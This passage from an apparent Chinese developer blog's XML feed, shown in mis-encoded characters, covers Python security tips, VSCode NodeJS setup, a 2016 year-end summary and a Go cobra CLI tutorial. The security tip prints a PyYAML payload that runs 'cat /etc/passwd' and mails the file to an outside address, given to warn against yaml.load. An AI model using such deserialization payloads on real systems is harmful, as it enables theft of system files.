subprocessçš„å‚æ•°ï¼Œç¡®ä¿æ²¡æœ‰ä¸æƒ³è¦çš„shellåŠŸèƒ½å¯ä»¥è¢«æ¶æ„ç”¨æˆ·åˆ©ç”¨ï¼Œè¿™å®Œå…¨æ˜¯é‡è¦çš„ã€‚åœ¨æ›´æ–°çš„Pythonç‰ˆæœ¬ä¸­ï¼Œå¯ä»¥ç”¨æ ‡å‡†åº“çš„shlex.quoteå‡½æ•°æ¥è¿›è¡Œshellè½¬ä¹‰ã€‚ åºåˆ—åŒ–-pyYAMLä½œä¸ºä¸€ä¸ªæµè¡Œçš„é…ç½®æ–‡ä»¶æ ¼å¼ï¼ŒYAMLä¸ä¸€å®šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªèƒ½å¤Ÿè¯±ä½¿ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç çš„å¼ºå¤§çš„åºåˆ—åŒ–åè®®ã€‚è®©å®ƒç”šè‡³æ›´å±é™©çš„æ˜¯ï¼Œäº‹å®ä¸ŠPythonçš„YAMLé»˜è®¤å®ç°â€”-PyYAMLè®©ååºåˆ—åŒ–çœ‹èµ·æ¥éå¸¸æ— è¾œï¼š1234567&gt;&gt;&gt; dangerous_input = """... some_option: !!python/object/apply:subprocess.call... args: [cat /etc/passwd | mail 719118794@qq.com]... kwds: &#123;shell: true&#125;... """&gt;&gt;&gt; yaml.load(dangerous_input)&#123;'some_option': 0&#125; è€Œ/etc/passwdå·²ç»è¢«çªƒå–äº†ã€‚ä¸€ä¸ªå»ºè®®çš„è§£å†³æ–¹æ³•æ˜¯æ€»æ˜¯ä½¿ç”¨ yaml.safe_loadæ¥å¤„ç†é‚£äº›ä½ ä¸ä¿¡ä»»çš„YAMLåºåˆ—åŒ–ã€‚å°½ç®¡å¦‚æ­¤ï¼Œç›®å‰çš„PyYAMLé»˜è®¤æ„Ÿè§‰æœ‰äº›é©±ä½¿äººè€ƒè™‘å…¶ä»–å€¾å‘äºä¸ºç›¸ä¼¼çš„ç›®çš„ä½¿ç”¨ dump/ loadå‡½æ•°åï¼ˆä½†æ˜¯ä»¥ä¸€ç§å®‰å…¨çš„æ–¹å¼çš„åºåˆ—åŒ–åº“]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python_tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨VSCodeå¿«é€Ÿæ­å»ºNodeJSå¼€å‘ç¯å¢ƒ]]></title>
    <url>%2F2017%2F01%2F01%2Fnodejs-vscode%2F</url>
    <content type="text"><![CDATA[æ–‡æœ¬çš„ç›®çš„æ˜¯å¿«é€Ÿæ­å»ºNodeJSçš„å¼€å‘ç¯å¢ƒï¼ŒNodeJSçš„å¸¸è§çš„å¼€å‘æ–¹å¼æœ‰2ç§ï¼Œä¸€ç§æ˜¯ç¼–è¾‘å™¨ï¼Œä¸€ç§æ˜¯IDEã€‚ç¼–è¾‘å™¨æ¨èä½¿ç”¨å¾®è½¯å‡ºå“çš„vscdoeï¼Œå› ä¸ºå…¶å¯åŠ¨é€Ÿåº¦å¿«ï¼Œè½»é‡çº§ï¼Œæ‰§è¡Œç®€å•ï¼Œè°ƒè¯•æ–¹ä¾¿ï¼Œè¿˜æœ‰ç•Œé¢æ¼‚äº®ã€‚è€ŒIDE æ— å¯åšéçš„å°±æ˜¯WebStormäº†ã€‚è¿™é‡Œä½¿ç”¨vscdoeæ­å»ºå¼€å‘ç¯å¢ƒï¼Œå› ä¸ºIDEçœŸçš„æ¯”è¾ƒè€—å†…å­˜ã€‚é™¤éå¼€å‘å¤§å‹é¡¹ç›®,å¦åˆ™è½»æ˜“æˆ‘ä¸å¼€IDEã€‚ VSCodeç®€ä»‹VSCodeå…¨ç§°æ˜¯Visual Studio Code, ç”±å¾®è½¯å‡ºå“,ä½†å®ƒä¸æ˜¯é‚£ä¸ªå¤§å—å¤´çš„Visual Studio ,å®ƒæ˜¯ä¸€ä¸ªç²¾ç®€ç‰ˆçš„è¿·ä½ Visual Studioï¼Œå¹¶ä¸”ï¼ŒVisual Studio Codeå¯ä»¥è·¨ï¼å¹³ï¼å°ï¼Windowsã€Macå’ŒLinuxé€šç”¨ã€‚ å®‰è£…VSCodeå¯ä»¥é€šè¿‡å®˜æ–¹ä¸‹è½½, ç”±äºä½ æˆ‘éƒ½æ‡‚çš„åŸå› ï¼Œå¯èƒ½æ— æ³•è®¿é—®ï¼Œå› æ­¤ä½ å¯èƒ½ä¼šéœ€è¦ä½¿ç”¨å›½å†…é•œåƒ,ç›´æ¥ä¸‹macç‰ˆæœ¬çš„å®‰è£…åŒ…ï¼Œå®‰è£…ã€‚ è¿è¡Œåœ¨VS Codeä¸­ï¼Œæˆ‘ä»¬å¯ä»¥éå¸¸æ–¹ä¾¿åœ°è¿è¡ŒJavaScriptæ–‡ä»¶ã€‚ VS Codeä»¥æ–‡ä»¶å¤¹ä½œä¸ºå·¥ç¨‹ç›®å½•ï¼ˆWorkspace Dirï¼‰ï¼Œæ‰€æœ‰çš„JavaScriptæ–‡ä»¶éƒ½å­˜æ”¾åœ¨è¯¥ç›®å½•ä¸‹ã€‚æ­¤å¤–ï¼ŒVS Codeåœ¨å·¥ç¨‹ç›®å½•ä¸‹è¿˜éœ€è¦ä¸€ä¸ª.vscodeçš„é…ç½®ç›®å½•ï¼Œé‡Œé¢å­˜æ”¾é‡ŒVS Codeéœ€è¦çš„é…ç½®æ–‡ä»¶ã€‚ å‡è®¾æˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªhelloçš„å·¥ç¨‹ï¼Œå› æ­¤æˆ‘éœ€è¦ä¸€ä¸ªhelloçš„ç›®å½•ä½œä¸ºå·¥ç¨‹ç›®å½•ï¼Œç„¶ååœ¨é‡Œé¢ç¼–å†™hello.jsæ–‡ä»¶ï¼Œåˆ™è¯¥å·¥ç¨‹ç›®å½•çš„ç»“æ„å¦‚ä¸‹ï¼š1234567hello/ &lt;-- workspace dir|+- hello.js &lt;-- JavaScript file|+- .vscode/ &lt;-- VS Code config | +- launch.json &lt;-- VS Code config file for JavaScript ç„¶ååˆ‡æ¢åˆ°debugæ¨¡å¼è¿›è¡Œè¿è¡Œï¼Œå…³äºdebugæ¨¡å¼åé¢ä»‹ç»ã€‚å¯¹äºæ›´ç»†èŠ‚ç›¸å…³çš„æ–‡æ¡£å¯ä»¥å‚è€ƒå¾®è½¯å®˜æ–¹æä¾›çš„JavaScript in VS Code æ™ºèƒ½æç¤ºå› ä¸ºä¹‹å‰å¾®è½¯æ¨å‡ºäº†typescriptè¯­è¨€ï¼Œç»“åˆtsdæ–‡ä»¶ï¼Œç”¨visual studioå†™typescriptä»£ç æ˜¯ç›¸å½“çˆ½çš„ï¼Œæ™ºèƒ½æç¤ºçš„åŠŸèƒ½éå¸¸nbã€‚ è¿™ä¸ªåŠŸèƒ½ç†æ‰€åº”å½“ä¹Ÿè¢«vscodeç»§æ‰¿äº†ï¼Œä½†æ˜¯ç°åœ¨tsdé¡¹ç›®å·²ç»è¿‡æœŸäº†ï¼Œæ¥è¿‡è¿™ä¸ªæ¥åŠ›æ£’çš„æ˜¯typings å› æ­¤æˆ‘ä»¬å°†é€šè¿‡Typingsæ¥å®ç°JavaScriptæ™ºèƒ½æç¤ºåŠŸ æ³¨æ„äº‹é¡¹ å®‰è£…NPM NPMæ˜¯å’ŒNode.jsä¸€èµ·å®‰è£…çš„ï¼Œå¦‚æœä½ æƒ³ä½¿ç”¨NPMçš„è¯ï¼Œé‚£ä¹ˆä½ åº”è¯¥å…ˆå®‰è£…Node.js Typings vs TSD Typingsä½œä¸ºTSDçš„æ›¿ä»£è€…è€Œå‡ºç°çš„ï¼Œå¦‚æœä½ å·²ç»å®‰è£…äº†TSDï¼Œé‚£ä¹ˆéœ€è¦çŸ¥é“ç°åœ¨TSDå·²ç»ä¸æ¨èä½¿ç”¨äº†ã€‚å¦‚æœå·²ç»å®‰è£…TSDè¯·æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤æ¥ç§»é™¤å®ƒ1npm rm -g tsd CNPM åœ¨å›½å†…ç”±äºå¢™çš„åŸå› ï¼Œå¤§éƒ¨åˆ†æ—¶å€™ä½¿ç”¨NPMå®‰è£…æ¨¡å—çš„é€Ÿåº¦ä¸Šä¼šå¾ˆæ…¢ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å…¶å®å¯ä»¥é€‰æ‹©å›½å†…æ·˜å®çš„NPMé•œåƒï¼Œå…³äºæ·˜å®NPMé•œåƒçš„ä½¿ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒæ·˜å® NPM é•œåƒ ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥è¿›è¡Œå®‰è£…å’Œä½¿ç”¨12npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm install koa å®‰è£…Typingsæˆ‘ä»¬é€šè¿‡cnpmæ¥å®‰è£…typings1234maojun@maojun-mbp$ npm install -g typingsmaojun@maojun-mbp$ typings -v2.0.0 é…ç½®æ™ºèƒ½æç¤ºå®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬éœ€è¦å®‰è£…ç›¸åº”çš„éœ€è¦æç¤ºåŠŸèƒ½åº“æˆ–è€…æ¡†æ¶çš„ç±»å‹ä¿¡æ¯æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ NodeSnippetï¼Œä¸ºäº†äº†è§£Typingsçš„ä½¿ç”¨æ–¹æ³•ï¼Œä½ å¯èƒ½éœ€è¦ç®€å•çœ‹çœ‹typings github ä½¿ç”¨å‘½ä»¤è¡Œè¿›å…¥åˆ°è¯¥ç›®å½•ä¸­ï¼Œåˆ†åˆ«è¾“å…¥ä¸‹é¢ä¸¤ä¸ªå‘½ä»¤æ¥å®‰è£…Nodeå’ŒLodashçš„ç±»å‹æ¥å£ä¿¡æ¯æ–‡ä»¶ï¼š12typings install dt~node --global --savetypings install lodash --save è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ NodeSnippetç›®å½•ä¸­å¤šäº†ä¸€äº›æ–‡ä»¶ï¼š12345678910111213 maojun@maojun-mbp$ tree ..â”œâ”€â”€ typingsâ”‚ â”œâ”€â”€ globalsâ”‚ â”‚ â””â”€â”€ nodeâ”‚ â”‚ â”œâ”€â”€ index.d.tsâ”‚ â”‚ â””â”€â”€ typings.jsonâ”‚ â”œâ”€â”€ index.d.tsâ”‚ â””â”€â”€ modulesâ”‚ â””â”€â”€ lodashâ”‚ â”œâ”€â”€ index.d.tsâ”‚ â””â”€â”€ typings.jsonâ””â”€â”€ typings.json è¿™äº›æ–‡ä»¶å°±æ˜¯ä¸ºæˆ‘ä»¬æä¾›æç¤ºä¿¡æ¯çš„ç±»å‹ç±»å‹æ–‡ä»¶(ä½¿ç”¨TypeScriptå®šä¹‰)ã€‚æŸ¥çœ‹Typingsæ˜¯å¦æ”¯æŒæŸä¸ªåº“æˆ–æ¡†æ¶çš„æ™ºèƒ½æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤:1typings search exampleName å¯åŠ¨æ™ºèƒ½æç¤ºé…ç½®å¥½äº†ç±»å‹æ¥å£åï¼Œå¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ¥å¯åŠ¨æç¤ºåŠŸèƒ½ï¼š æ–‡ä»¶å¤´åŠ æ³¨é‡Š 1/// &lt;reference path="./typings/index.d.ts" /&gt; åœ¨ç›®å½•(åœ¨è¿™é‡Œæ˜¯NodeSnippetæ–‡ä»¶å¤¹ä¸­)å¢åŠ ä¸€ä¸ªåä¸ºjsconfig.jsonçš„ç©ºæ–‡ä»¶ æ›´å¤šjsconfig.jsonæ–‡ä»¶çš„å†…å®¹å¯ä»¥å‚è€ƒï¼š JavaScript in VS Code è¿™æ ·æˆ‘ä»¬å†™ä»£ç çš„æ—¶å€™å°±æœ‰æ™ºèƒ½æç¤ºåŠŸèƒ½äº†ï¼Œ æ•ˆæœå¦‚ä¸‹: è°ƒè¯•å¦‚ä½•è°ƒè¯•å†™å¥½äº†çš„JSç¨‹åºå–ƒï¼Ÿ ç”¨VS Codeå¿«é€Ÿåˆ›å»ºlaunch.jsonæ–‡ä»¶, ä¸»è¦æ˜¯ä¿®æ”¹programè¿™ä¸ªå‚æ•°ï¼ŒæŒ‡æ˜ä½  å¯æ‰§è¡Œæ–‡ä»¶ä½ç½®ã€‚ å…³äºDebugçš„ç»†èŠ‚ï¼Œè¯·å‚è€ƒDebugging 123456789101112131415161718192021&#123; // Use IntelliSense to learn about possible Node.js debug attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 "version": "0.2.0", "configurations": [ &#123; "type": "node", "request": "launch", "name": "å¯åŠ¨ç¨‹åº", "program": "$&#123;workspaceRoot&#125;/app.js", "cwd": "$&#123;workspaceRoot&#125;" &#125;, &#123; "type": "node", "request": "attach", "name": "é™„åŠ åˆ°è¿›ç¨‹", "port": 5858 &#125; ]&#125; æ•ˆæœå¦‚ä¸‹:]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016æ€»ç»“ä¸2017è®¡åˆ’]]></title>
    <url>%2F2016%2F12%2F31%2F2016-summary%2F</url>
    <content type="text"><![CDATA[å­”å­æ›°:â€å¾æ—¥ä¸‰çœå¾èº«â€, å¹³æ—¶å¾ˆå°‘ä¼šé™ä¸‹å¿ƒæ¥åçœå’Œæ€»ç»“ä¸€æ®µæ—¶é—´çš„åŠŸä¸è¿‡, 2016é©¬ä¸Šå°±è¦è¿‡å»äº†ï¼Œåœ¨è¿™ä¸€å¹´å°†è¦ç»“æŸä¹‹æ—¶, è¿˜æ˜¯æƒ³å›è¿‡ä¸€ä¸‹è¿™ä¸€å¹´æ¥çš„å¾—ä¸å¤±, é¡ºä¾¿å®‰æ’ä¸‹æ¥å¹´çš„è®¡åˆ’ã€‚ è®°å½•ä¸‹è¿™ä¸€å¹´æ¥è‡ªå·±çš„å˜åŒ–, åŒæ—¶ä¹Ÿä¸ºæ¥å¹´å†æˆ˜ä½œå‡†å¤‡, è€Œä¸”æˆ‘è¿™äººè®°æ€§ä¸å¥½, ç•™ä¸ªåº•,ç…§äº®è‡ªå·±éœ€è¦èµ°çš„è·¯ã€‚ è½¬ç¬å³é€çš„20162016æ˜¯ç¹å¿™çš„ä¸€å¹´ï¼Œå·¥ä½œä¸Šå¤„å¤„å……æ»¡æŒ‘æˆ˜ï¼Œæœ‰äº›æŒ‘æˆ˜æ˜¯è‡ªå·±å–œæ¬¢çš„ï¼Œæœ‰äº›æŒ‘æˆ˜ä¹Ÿæ˜¯è‡ªå·±æ¯”è¾ƒæŠµè§¦çš„ï¼Œæˆ‘å–œæ¬¢å¼€å‘ï¼Œä»è¿ç»´å¼€å‘è½¬è€Œå‚ä¸å¤§å‹ç³»ç»Ÿå¼€å‘ï¼Œè¿™çš„ç¡®æ˜¯ä¸€ä¸ªä¸å°çš„æŒ‘æˆ˜ï¼Œæˆ‘æ˜¯ä¸€ä¸ªå¯¹æŠ€æœ¯æœ‰ç‚¹æ¿€æƒ…çš„äººï¼Œå› æ­¤è¿™ä¸ªæŒ‘æˆ˜å¯¹æˆ‘è€Œè¨€è¿˜æ˜¯æ¯”è¾ƒå–œæ¬¢çš„ã€‚åæ¥åŒæ—¶åšèµ·äº†äº§å“è®¾è®¡, æ¯å¤©æ‰£è„‘è¢‹, çœ‹åˆ«äººçš„äº§å“ï¼Œç”»äº§å“è®¾è®¡å›¾ï¼Œ è¿™äº›åœ¨å½“æ—¶çš„æˆ‘æ˜¯å¾ˆæŠµè§¦çš„, å½“æ—¶æˆ‘è¿˜å¤„äºå•çº¯çš„æƒ³ç§¯ç´¯æŠ€æœ¯çš„é˜¶æ®µã€‚ç°åœ¨çœ‹æ¥è¿™æ®µç»å†ä¹Ÿæ˜¯æˆ‘å®è´µçš„è´¢å¯Œ, æ¯•ç«Ÿäº§å“å†³å®šä¸œè¥¿çš„ä»·å€¼ï¼Œç”¨å†ç‰›å‰çš„æŠ€æœ¯,åšä¸€ä¸ªæ²¡æœ‰ä»·å€¼çš„ä¸œè¥¿, è¿™æ˜¯ä¸€ä»¶æ„šè ¢çš„è¡Œä¸ºï¼Œæˆ‘è¿™é‡Œè¯´çš„ä»·å€¼æ˜¯é•¿è¿œä»·å€¼ï¼Œè€Œä¸æ˜¯å½“ä¸‹çœ‹èµ·æ¥æœ‰ä»·å€¼, è¿™ä¸ªè¯´èµ·æ¥å¾ˆæ‚¬ï¼Œä»¥åæœ‰æœºä¼šæ·±å…¥è®¨è®ºè¿™ä¸ªã€‚ 2016è¿™ä¸€å¹´ä¹Ÿåœ¨å’ŒJumpServerä¸€åŒæˆé•¿çš„ä¸€å¹´ï¼Œæ„Ÿè§¦ä¹Ÿè›®å¤šçš„ï¼Œé¦–å…ˆæ˜¯æŠ€æœ¯çš„æˆé•¿ï¼Œä¸€ä¸ªå¼€æºäº§å“çš„æŠ€æœ¯çš„è¿­ä»£ï¼Œæˆ‘ä»¬è‡´åŠ›äºè®¾è®¡NBçš„äº§å“å’Œå†™å‡ºæ¼‚äº®çš„ä»£ç ã€‚å…¶æ¬¡ä¸ºæœ‰å¯èƒ½çš„èèµ„è°ˆåˆ¤è€Œå…´å¥‹è¿‡ï¼Œç„¶è€Œæœ€åè¿˜æ˜¯å¹³é™ä¸‹æ¥, æ…¢æ…¢åšä¸€ä¸ªè‡ªå·±è®¤å¯çš„èƒ½åŠ›èŒƒå›´ä¹‹å†…çš„äº§å“ã€‚ å·¥ä½œä¸Šçš„äº‹å„¿, æ€»æ˜¯æœ‰é‚£ä¹ˆç‚¹ç´§ç»·, å…¶å®ç”Ÿæ´»ä¸Šä¹Ÿæœ‰å¾ˆå¤šå€¼å¾—é«˜å…´çš„äº‹å„¿ï¼Œæˆ‘ä»¬æœ‰äº†è‡ªå·±çš„æˆ¿å­ï¼Œå¹¶ä¸”æ¬è¿›å»äº†ï¼Œå‘Šåˆ«äº†ç§Ÿæˆ¿çš„æ—¥å­ï¼Œè¿™ä¸€åˆ‡å¤šè°¢æˆ‘çš„è€å©†æ‰“ç†ï¼Œæˆ‘åŸºæœ¬æ˜¯å•¥å¿ƒéƒ½æ²¡æ“è¿‡ã€‚å…¶æ¬¡ï¼Œæˆ‘å¥³å„¿å’Œæˆ‘å…³ç³»ä¹Ÿå¾ˆä¸é”™ï¼Œè™½ç„¶å¥¹ç”Ÿæ°”çš„æ—¶å€™åªæ‰¾å¥¹å¦ˆå¦ˆï¼Œä½†æ˜¯æˆ‘åœ¨å¥¹å¿ƒä¸­çš„åœ°ä½ä¹Ÿä»…æ¬¡äºå¥¹å¦ˆå¦ˆï¼Œæˆ‘ä¹Ÿå¿ƒæœ‰æ„§ç–šï¼Œä½œä¸ºä¸€ä¸ªçˆ¶äº²æˆ‘é™ªä¼´å¥¹çš„æ—¶å€™æ˜¯æœ‰ç‚¹å°‘äº†ã€‚è¿˜æœ‰æˆ‘çš„å¥½æ­æ¡£ï¼Œåœ¨æˆ‘æœ€éœ€è¦é’±çš„æ—¶å€™, ä¸€èº«ä¸å­çš„ç›´æ¥è½¬æˆ‘æ”¯ä»˜å®ä¸Š,äººç”Ÿä¸­èƒ½äº¤åˆ°ä¸€ä¸ªè¿™æ ·çš„æœ‹å‹ï¼Œæ˜¯æˆ‘çš„è«å¤§çš„è£å¹¸ã€‚ è¿˜æœ‰ä¸€ä¸ªäº‹å„¿ï¼Œæˆ‘ç»ˆäºç”¨ä¸ŠMacäº†ï¼Œè™½ç„¶æ˜¯ä¸€ä¸ªäºŒæ‰‹çš„MBPï¼Œä½†æ˜¯è¿™å¯¹æ»¡è¶³ä¸€ä¸ªå±Œä¸çš„è™šè£å¿ƒå®Œå…¨å—ç”¨äº†, è¯´å²”äº†, æˆ‘å†ä¹Ÿä¸ç”¨åœ¨Windowsä¸Šè£…Ubuntuå¼€å‘äº†ã€‚ ç¬æ¯ä¸‡å˜çš„2017å˜åŒ–å’Œé©æ–°æ˜¯å¾ˆå¿«çš„, æ¯”å¦‚OpenStackæ²¡æœ‰é‚£ä¹ˆçƒ­äº†, å®¹å™¨æŠ€æœ¯ä¹ŸåŸºæœ¬æˆäº†å¼€å‘çš„å¿…å¤‡æŠ€èƒ½, æ— è®ºä½ ä½œä¸ºä¸€ä¸ªå‰ç«¯å¼€å‘è¿˜æ˜¯åç«¯å¼€å‘JavaScriptéƒ½å¿«æˆä¸ºä¸€é—¨å¿…å¤‡è¯­è¨€äº†ã€‚å‰åç«¯çš„å®Œå…¨åˆ†ç¦»ä¹Ÿæ„ˆæ¼”æ„ˆçƒˆ, å„ç§å‰æ®µæ¡†æ¶çš„å˜åŒ–ã€‚ä¼´éšè€Œæ¥çš„æ˜¯å¾®æœåŠ¡+å®¹å™¨æŠ€æœ¯çš„ç´§å¯†ç»“åˆã€‚åœ¨æœ€åDDDä¹Ÿéšç€å¾®æœåŠ¡çš„å‡ºç°ï¼Œå¯¹å¼€å‘äººå‘˜æå‡ºäº†æ›´é«˜çš„éœ€æ±‚, ä»¥åé‚£ç§åªä¼šå†™ä»£ç çš„äººå°†æ„ˆæ¥æ„ˆå°‘äº†ã€‚ æˆ‘Holdä¸ä½è¿™äº›ï¼Œå› æ­¤åœ¨æŠ€æœ¯æ–¹é¢æˆ‘ä»…èƒ½åˆ—å‡ºæˆ‘éœ€è¦æå‡çš„ä¹¦å•: Pythonæå‡ä¹¦å•(ä»Šå¹´ä¸»åŠ›) åŸºç¡€å›è¿‡ å»–é›ªå³°å®˜ç½‘ Think Python 2ed ä¸­è¯‘ç‰ˆç²¾æ ¡ PDF ç”µå­ä¹¦ è¿›é˜¶æ·± python3-cookbook ç”µå­ä¹¦Pythoné«˜æ‰‹ä¹‹è·¯ å¸¸è§çš„ä¸€äº›ä»£ç å®ç° pythonå®ä¾‹æ‰‹å†Œ ç½‘ç«™ä¸Šçš„æ–‡ç«  è®¾è®¡æ¨¡å¼ å¿«é€Ÿç‰ˆå¤§è¯è®¾è®¡æ¨¡å¼ ä¸€äº›æœ€æ–°çš„ä¾‹å­ ç²¾é€šPythonè®¾è®¡æ¨¡å¼ æ•°æ®ç»“æ„ä¸ç®—æ³• å¿«é€Ÿé˜…è¯»æ€»ç»“ ç”µå­ä¹¦ï¼šData Structures and Algorithms with Python-2015 æºç é˜…è¯» Django Class Based View Flask æºç é˜…è¯» Openstack KeyStone æºç é˜…è¯» ç†è§£Pythonè§£é‡Šå™¨ ç”¨Pythonå®ç°ä¸€ä¸ªPythonè§£é‡Šå™¨ Golangæå‡ä¹¦å• å›è¿‡åŸºç¡€ï¼š Go Web ç¼–ç¨‹ Goå…¥é—¨æŒ‡å— JavaScriptæå‡ä¹¦å• å›è¿‡åŸºç¡€ï¼š å»–é›ªå³°å®˜ç½‘ é˜®ä¸€å³°çš„javascriptæ•™ç¨‹ ECMAScript 6 å…¥é—¨ é™¤äº†æŠ€æœ¯, è¿˜åº”è¯¥æœ‰ç”Ÿæ´»ã€‚è€Œç”Ÿæ´»å°±æ˜¯: èµ¶ç´§æŠŠè´¦è¿˜å®Œ]]></content>
      <categories>
        <category>æ‚è°ˆ</category>
        <category>å¹´ç»ˆæ€»ç»“</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•ä½¿ç”¨golangç¼–å†™æ¼‚äº®çš„å‘½ä»¤è¡Œå·¥å…·]]></title>
    <url>%2F2016%2F12%2F30%2Fgo-cobra%2F</url>
    <content type="text"><![CDATA[æ— è®ºæ˜¯Openstackè¿˜æ˜¯Dockeréƒ½æœ‰ä¸€ä¸ªæ¼‚äº®çš„å‘½ä»¤è¡Œå·¥å…·ï¼ŒOpenstackçš„å‘½ä»¤è¡Œå·¥å…·ä¸»è¦ä½¿ç”¨çš„æ˜¯Pythonçš„argparseåº“ï¼Œè‡³äºDockerçš„CLIçš„å®ç°è¿˜æ²¡çœ‹ï¼Œä½†æ˜¯ä»Šå¤©çœ‹åˆ°äº†ä¸€ä¸ªåœ¨Golangä¸­ ç”¨äºæ„å»ºåƒDockerå‘½ä»¤è¡Œé£æ ¼çš„ä¸€ä¸ªåº“:cobra cobraç®€ä»‹Cobraæ—¢æ˜¯ä¸€ä¸ªç”¨æ¥åˆ›å»ºå¼ºå¤§çš„ç°ä»£CLIå‘½ä»¤è¡Œçš„golangåº“ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç”Ÿæˆç¨‹åºåº”ç”¨å’Œå‘½ä»¤è¡Œæ–‡ä»¶çš„ç¨‹åºã€‚å®ƒæä¾›çš„åŠŸèƒ½æœ‰ï¼š ç®€æ˜“çš„å­å‘½ä»¤è¡Œæ¨¡å¼ï¼Œå¦‚ app serverï¼Œ app fetchç­‰ç­‰ å®Œå…¨å…¼å®¹posixå‘½ä»¤è¡Œæ¨¡å¼ åµŒå¥—å­å‘½ä»¤subcommand æ”¯æŒå…¨å±€ï¼Œå±€éƒ¨ï¼Œä¸²è”flags ä½¿ç”¨Cobraå¾ˆå®¹æ˜“çš„ç”Ÿæˆåº”ç”¨ç¨‹åºå’Œå‘½ä»¤ï¼Œä½¿ç”¨cobra create appnameå’Œcobra add cmdname å¦‚æœå‘½ä»¤è¾“å…¥é”™è¯¯ï¼Œå°†æä¾›æ™ºèƒ½å»ºè®®ï¼Œå¦‚ app srverï¼Œå°†æç¤ºsrveræ²¡æœ‰ï¼Œæ˜¯å¦æ˜¯app server è‡ªåŠ¨ç”Ÿæˆcommandså’Œflagsçš„å¸®åŠ©ä¿¡æ¯ è‡ªåŠ¨ç”Ÿæˆè¯¦ç»†çš„helpä¿¡æ¯ï¼Œå¦‚app help è‡ªåŠ¨è¯†åˆ«-hï¼Œâ€“helpå¸®åŠ©flag è‡ªåŠ¨ç”Ÿæˆåº”ç”¨ç¨‹åºåœ¨bashä¸‹å‘½ä»¤è‡ªåŠ¨å®ŒæˆåŠŸèƒ½ è‡ªåŠ¨ç”Ÿæˆåº”ç”¨ç¨‹åºçš„manæ‰‹å†Œ å‘½ä»¤è¡Œåˆ«å è‡ªå®šä¹‰helpå’Œusageä¿¡æ¯ å¯é€‰çš„ç´§å¯†é›†æˆçš„viper apps ä»åŠŸèƒ½ä¸Šçœ‹å®Œå…¨è¶…è¶Šäº†argparseï¼Œ ä¸‹é¢å°†åšä¸€ä¸ªç®€å•çš„æµ‹è¯•ï¼Œä½“éªŒä¸‹cobraçš„å¼ºå¤§ å®‰è£…å®‰è£…cobraéœ€è¦ç¿»å¢™ï¼Œæˆ‘çš„ç¯å¢ƒæ˜¯Macï¼Œä½¿ç”¨ss + polipoæ¥æä¾›httpsçš„æ–¹å‘ä»£ç†ã€‚æˆ‘çš„ä»£ç†ç«¯å£åœ¨8123,æ‰€ä»¥å‘½ä»¤è¡Œæ˜¯è¿™æ ·çš„1$https_proxy=localhost:8123 go get -v github.com/spf13/cobra/cobra å®‰è£…å®Œæˆåå¯ä»¥çœ‹åˆ°cobraçš„ä¸€äº›å¸®åŠ©ä¿¡æ¯1234567891011121314151617181920maojun@maojun-mbp$ cobra -hCobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: cobra [command]Available Commands: add Add a command to a Cobra Application init Initialize a Cobra ApplicationFlags: -a, --author string Author name for copyright attribution (default "YOUR NAME") --config string config file (default is $HOME/.cobra.yaml) -l, --license license Name of license for the project (can provide license in config) -b, --projectbase string base project directory, e.g. github.com/spf13/ --viper Use Viper for configuration (default true)Use "cobra [command] --help" for more information about a command. ä½¿ç”¨æ¥ä¸‹æ¥å°†ä½¿ç”¨cobraæ„å»ºä¸€ä¸ªä¸å¸¦å­å‘½ä»¤çš„CLIå’Œå¸¦å­å‘½ä»¤çš„CLI åˆå§‹åŒ–æˆ‘ä»¬å¯ä»¥é€šè¿‡cobraæä¾›çš„initå‘½ä»¤æ¥ç”ŸæˆCLIçš„æ¡†æ¶ä»£ç ï¼Œå› æ­¤åˆ‡æ¢åˆ°GOPATH/srcä¸‹é¢,åˆå§‹CLIæ¡†æ¶12345maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]` è¿™ä¸ªå‘½ä»¤ä¼šå¸®ä½ ç”Ÿæˆè¿™æ ·ä¸€ä¸ªæ¡†æ¶ä»£ç 123456 maojun@maojun-mbp$ tree demodemoâ”œâ”€â”€ LICENSEâ”œâ”€â”€ cmdâ”‚ â””â”€â”€ root.goâ””â”€â”€ main.go ç®€å•çš„CLIåœ¨å†™ä¸€äº›ç®€å•çš„CLIçš„æ—¶å€™æˆ‘ä»¬å…¶å®æ˜¯ä¸éœ€è¦æœ‰å­å‘½ä»¤çš„ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦è¿™æ ·ä¸€ç§ç®€å•çš„CLI12345678910demo.exeDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -h, --help help for demo -n, --name string person's name æ¥ä¸‹æ¥æˆ‘ä»¬å°±åœ¨ä¸Šé¢ç”Ÿæˆçš„ä»£ç 